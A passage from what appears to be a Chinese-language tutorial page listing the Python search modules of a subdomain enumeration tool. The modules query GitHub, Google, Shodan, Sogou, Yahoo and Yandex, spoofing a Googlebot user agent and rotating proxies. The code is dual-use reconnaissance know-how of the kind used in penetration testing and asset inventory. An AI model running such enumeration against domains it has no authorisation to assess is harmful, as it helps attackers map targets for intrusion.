class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GithubAPI</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.source = <span class="hljs-string">&#x27;GithubAPISearch&#x27;</span><br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://api.github.com/search/code&#x27;</span><br>        self.domain = domain<br>        self.session = requests.Session()<br>        self.session.trust_env = <span class="hljs-literal">False</span><br>        self.auth_url = <span class="hljs-string">&#x27;https://api.github.com&#x27;</span><br>        self.token = settings.github_api_token<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">auth_github</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        github api 认证</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :return: 认证失败返回False 成功返回True</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.session.headers.update(&#123;<span class="hljs-string">&#x27;Authorization&#x27;</span>: <span class="hljs-string">&#x27;token &#x27;</span> + self.token&#125;)<br>        <span class="hljs-keyword">try</span>:<br>            resp = self.session.get(self.auth_url)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:<br>            resp_json = resp.json()<br>            msg = resp_json.get(<span class="hljs-string">&#x27;message&#x27;</span>)<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, msg)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        向接口查询子域并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.session.headers = self.get_header()<br>        self.session.proxies = self.get_proxy(self.source)<br>        self.session.verify = self.verify<br>        self.session.headers.update(<br>            &#123;<span class="hljs-string">&#x27;Accept&#x27;</span>: <span class="hljs-string">&#x27;application/vnd.github.v3.text-match+json&#x27;</span>&#125;)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.auth_github():<br>            logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module login failed&#x27;</span>)<br>            <span class="hljs-keyword">return</span><br>        page = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            params = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: self.domain, <span class="hljs-string">&#x27;per_page&#x27;</span>: <span class="hljs-number">100</span>,<br>                      <span class="hljs-string">&#x27;page&#x27;</span>: page, <span class="hljs-string">&#x27;sort&#x27;</span>: <span class="hljs-string">&#x27;indexed&#x27;</span>&#125;<br>            <span class="hljs-keyword">try</span>:<br>                resp = self.session.get(self.addr, params=params)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> resp.status_code != <span class="hljs-number">200</span>:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;self.source&#125;</span> module query failed&#x27;</span>)<br>                <span class="hljs-keyword">break</span><br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> subdomains:<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            page += <span class="hljs-number">1</span><br>            <span class="hljs-keyword">try</span>:<br>                resp_json = resp.json()<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                logger.log(<span class="hljs-string">&#x27;ERROR&#x27;</span>, e.args)<br>                <span class="hljs-keyword">break</span><br>            total_count = resp_json.get(<span class="hljs-string">&#x27;total_count&#x27;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(total_count, <span class="hljs-built_in">int</span>):<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> page * <span class="hljs-number">100</span> &gt; total_count:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> page * <span class="hljs-number">100</span> &gt; <span class="hljs-number">1000</span>:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-8-google"><a href="#6-8-google" class="headerlink" title="6.8 google"></a>6.8 google</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Google</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;GoogleSearch&#x27;</span><br>        self.init = <span class="hljs-string">&#x27;https://www.google.com/&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.google.com/search&#x27;</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        page_num = <span class="hljs-number">1</span><br>        per_page_num = <span class="hljs-number">50</span><br>        self.header = self.get_header()<br>        self.header.update(&#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Googlebot&#x27;</span>,<br>                            <span class="hljs-string">&#x27;Referer&#x27;</span>: <span class="hljs-string">&#x27;https://www.google.com&#x27;</span>&#125;)<br>        self.proxy = self.get_proxy(self.source)<br>        resp = self.get(self.init)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        self.cookie = resp.cookies<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.delay = random.randint(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)<br>            time.sleep(self.delay)<br>            self.proxy = self.get_proxy(self.source)<br>            word = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            payload = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: word, <span class="hljs-string">&#x27;start&#x27;</span>: page_num, <span class="hljs-string">&#x27;num&#x27;</span>: per_page_num,<br>                       <span class="hljs-string">&#x27;filter&#x27;</span>: <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-string">&#x27;btnG&#x27;</span>: <span class="hljs-string">&#x27;Search&#x27;</span>, <span class="hljs-string">&#x27;gbv&#x27;</span>: <span class="hljs-string">&#x27;1&#x27;</span>, <span class="hljs-string">&#x27;hl&#x27;</span>: <span class="hljs-string">&#x27;en&#x27;</span>&#125;<br>            resp = self.get(url=self.addr, params=payload)<br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            page_num += per_page_num<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;start=&#x27;</span> + <span class="hljs-built_in">str</span>(page_num) <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;302 Moved&#x27;</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-9-google-api"><a href="#6-9-google-api" class="headerlink" title="6.9 google_api"></a>6.9 google_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GoogleAPI</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;GoogleAPISearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.googleapis.com/customsearch/v1&#x27;</span><br>        self.delay = <span class="hljs-number">1</span><br>        self.key = settings.google_api_key<br>        self.<span class="hljs-built_in">id</span> = settings.google_api_id<br>        self.per_page_num = <span class="hljs-number">10</span>  <span class="hljs-comment"># 每次只能请求10个结果</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            word = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            params = &#123;<span class="hljs-string">&#x27;key&#x27;</span>: self.key, <span class="hljs-string">&#x27;cx&#x27;</span>: self.<span class="hljs-built_in">id</span>,<br>                      <span class="hljs-string">&#x27;q&#x27;</span>: word, <span class="hljs-string">&#x27;fields&#x27;</span>: <span class="hljs-string">&#x27;items/link&#x27;</span>,<br>                      <span class="hljs-string">&#x27;start&#x27;</span>: self.page_num, <span class="hljs-string">&#x27;num&#x27;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, params)<br>            subdomains = self.match_subdomains(resp)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            self.page_num += self.per_page_num<br>            <span class="hljs-keyword">if</span> self.page_num &gt; <span class="hljs-number">100</span>:  <span class="hljs-comment"># 免费的API只能查询前100条结果</span><br>                <span class="hljs-keyword">break</span><br><br></code></pre></div></td></tr></table></figure><h2 id="6-10-shodan-api"><a href="#6-10-shodan-api" class="headerlink" title="6.10 shodan_api"></a>6.10 shodan_api</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ShodanAPI</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;ShodanAPISearch&#x27;</span><br>        self.key = settings.shodan_api_key<br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        url = <span class="hljs-string">f&#x27;https://api.shodan.io/dns/domain/<span class="hljs-subst">&#123;self.domain&#125;</span>?key=<span class="hljs-subst">&#123;self.key&#125;</span>&#x27;</span><br>        resp = self.get(url)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        data = resp.json()<br>        names = data.get(<span class="hljs-string">&#x27;subdomains&#x27;</span>)<br>        subdomain_str = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">set</span>(<span class="hljs-built_in">map</span>(<span class="hljs-keyword">lambda</span> name: <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;name&#125;</span>.<span class="hljs-subst">&#123;self.domain&#125;</span>&#x27;</span>, names)))<br>        self.subdomains = self.collect_subdomains(subdomain_str)<br></code></pre></div></td></tr></table></figure><h2 id="6-11-so"><a href="#6-11-so" class="headerlink" title="6.11 so"></a>6.11 so</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">So</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SoSearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.so.com/s&#x27;</span><br>        self.limit_num = <span class="hljs-number">640</span>  <span class="hljs-comment"># 限制搜索条数</span><br>        self.per_page_num = <span class="hljs-number">10</span>  <span class="hljs-comment"># 默认每页显示10页</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            word = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            payload = &#123;<span class="hljs-string">&#x27;q&#x27;</span>: word, <span class="hljs-string">&#x27;pn&#x27;</span>: page_num&#125;<br>            resp = self.get(url=self.addr, params=payload)<br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            page_num += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;a id=&quot;snext&quot;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># 搜索条数限制</span><br>            <span class="hljs-keyword">if</span> self.page_num * self.per_page_num &gt;= self.limit_num:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-12-sogou"><a href="#6-12-sogou" class="headerlink" title="6.12 sogou"></a>6.12 sogou</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Sogou</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;SogouSearch&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://www.sogou.com/web&#x27;</span><br>        self.limit_num = <span class="hljs-number">1000</span>  <span class="hljs-comment"># 限制搜索条数</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.page_num = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            self.header = self.get_header()<br>            self.proxy = self.get_proxy(self.source)<br>            word = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            payload = &#123;<span class="hljs-string">&#x27;query&#x27;</span>: word, <span class="hljs-string">&#x27;page&#x27;</span>: self.page_num,<br>                       <span class="hljs-string">&quot;num&quot;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, payload)<br>            subdomains = self.match_subdomains(resp, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            self.page_num += <span class="hljs-number">1</span><br>            <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&lt;a id=&quot;sogou_next&quot;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:<br>                <span class="hljs-keyword">break</span><br>            <span class="hljs-comment"># 搜索条数限制</span><br>            <span class="hljs-keyword">if</span> self.page_num * self.per_page_num &gt;= self.limit_num:<br>                <span class="hljs-keyword">break</span><br></code></pre></div></td></tr></table></figure><h2 id="6-13-yahoo"><a href="#6-13-yahoo" class="headerlink" title="6.13 yahoo"></a>6.13 yahoo</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yahoo</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;YahooSearch&#x27;</span><br>        self.init = <span class="hljs-string">&#x27;https://search.yahoo.com/&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://search.yahoo.com/search&#x27;</span><br>        self.limit_num = <span class="hljs-number">1000</span>  <span class="hljs-comment"># Yahoo限制搜索条数</span><br>        self.delay = <span class="hljs-number">2</span><br>        self.per_page_num = <span class="hljs-number">30</span>  <span class="hljs-comment"># Yahoo每次搜索最大条数</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span class="hljs-string"></span><br><span class="hljs-string">        :param str domain: 域名</span><br><span class="hljs-string">        :param str filtered_subdomain: 过滤的子域</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        self.header = self.get_header()<br>        self.proxy = self.get_proxy(self.source)<br>        resp = self.get(self.init)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>            <span class="hljs-keyword">return</span><br>        self.cookie = resp.cookies  <span class="hljs-comment"># 获取cookie Yahoo在搜索时需要带上cookie</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            time.sleep(self.delay)<br>            self.proxy = self.get_proxy(self.source)<br>            query = <span class="hljs-string">&#x27;site:.&#x27;</span> + domain + filtered_subdomain<br>            params = &#123;<span class="hljs-string">&#x27;p&#x27;</span>: query, <span class="hljs-string">&#x27;b&#x27;</span>: self.page_num, <span class="hljs-string">&#x27;pz&#x27;</span>: self.per_page_num&#125;<br>            resp = self.get(self.addr, params)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> resp:<br>                <span class="hljs-keyword">return</span><br>            text = resp.text.replace(<span class="hljs-string">&#x27;&lt;b&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>).replace(<span class="hljs-string">&#x27;&lt;/b&gt;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>            subdomains = self.match_subdomains(text, fuzzy=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> self.check_subdomains(subdomains):<br>                <span class="hljs-keyword">break</span><br>            self.subdomains.update(subdomains)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;&gt;Next&lt;/a&gt;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> resp.text:  <span class="hljs-comment"># 搜索页面没有出现下一页时停止搜索</span><br>                <span class="hljs-keyword">break</span><br>            self.page_num += self.per_page_num<br>            <span class="hljs-keyword">if</span> self.page_num &gt;= self.limit_num:  <span class="hljs-comment"># 搜索条数限制</span><br>                <span class="hljs-keyword">break</span><br><br></code></pre></div></td></tr></table></figure><h2 id="6-14-yandex"><a href="#6-14-yandex" class="headerlink" title="6.14 yandex"></a>6.14 yandex</h2><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Yandex</span>(<span class="hljs-params">Search</span>):</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self, domain</span>):</span><br>        Search.__init__(self)<br>        self.domain = domain<br>        self.module = <span class="hljs-string">&#x27;Search&#x27;</span><br>        self.source = <span class="hljs-string">&#x27;YandexSearch&#x27;</span><br>        self.init = <span class="hljs-string">&#x27;https://yandex.com/&#x27;</span><br>        self.addr = <span class="hljs-string">&#x27;https://yandex.com/search&#x27;</span><br>        self.limit_num = <span class="hljs-number">1000</span>  <span class="hljs-comment"># 限制搜索条数</span><br>        self.delay = <span class="hljs-number">5</span><br><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">search</span>(<span class="hljs-params">self, domain, filtered_subdomain=<span class="hljs-string">&#x27;&#x27;</span></span>):</span><br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        发送搜索请求并做子域匹配</span><br><span 